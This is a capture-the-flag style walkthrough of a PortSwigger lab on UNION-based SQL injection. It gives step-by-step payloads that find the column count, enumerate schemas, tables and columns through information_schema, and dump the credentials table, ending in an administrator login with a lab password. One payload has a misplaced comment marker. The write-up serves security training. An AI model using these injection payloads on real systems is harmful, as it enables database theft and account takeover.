---
description: >-
  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
---

# SQL injection attack, listing the database contents on non-Oracle databases

<figure><img src="../../../.gitbook/assets/1 (160).png" alt=""><figcaption></figcaption></figure>

Let's filter for `Food & Drink`.

<figure><img src="../../../.gitbook/assets/2 (6).png" alt=""><figcaption></figcaption></figure>

Since we are proxying the traffic through Burp Suite, we can go to the `Proxy > HTTP History` tab to view this request.

<figure><img src="../../../.gitbook/assets/3 (7).png" alt=""><figcaption></figcaption></figure>

Let's forward the request to the `Repeater` for further modification.&#x20;

Once in the `Repeater`, let's set the `category` parameter to the following:

```
' UNION SELECT 'test'--
```

<figure><img src="../../../.gitbook/assets/4 (3).png" alt=""><figcaption></figcaption></figure>

Since the application returns an error, we know that the number of columns in the current query is more than 1. Let's set the `category` parameter to the following:

```
' UNION SELECT 'test','test'--
```

<figure><img src="../../../.gitbook/assets/5 (4).png" alt=""><figcaption></figcaption></figure>

Now that we know the current query has two columns, we can start enumerating the databases.

```
' UNION SELECT schema_name, NULL FROM information_schema.schemata--
```

<figure><img src="../../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>

Now let's enumerate the tables present in the `public` database by setting the `category` parameter to:

```
' UNION SELECT table_name, NULL FROM information_schema.tables-- WHERE table_schema='public'--
```

<figure><img src="../../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>

Next, we need to find the columns present in the `users_bfbtjz` table. We can do that by setting the `category` parameter to the following:

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_bfbtjz'--
```

<figure><img src="../../../.gitbook/assets/22 (1).png" alt=""><figcaption></figcaption></figure>

We can now retrieve the usernames and password from the `username_ylkdae` and `password_sdbuqk` columns respectively.&#x20;

For that we have to set the `category` parameter to the following:

```
' UNION SELECT username_ylkdae, password_sdbuqk FROM users_bfbtjz--
```

<figure><img src="../../../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>

We can now login as the administrator using the following credentials:

| Username      | Password             |
| ------------- | -------------------- |
| administrator | x3lp8yt4oyymkeu9bppm |

<figure><img src="../../../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>

We have solved the lab.

<figure><img src="../../../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>
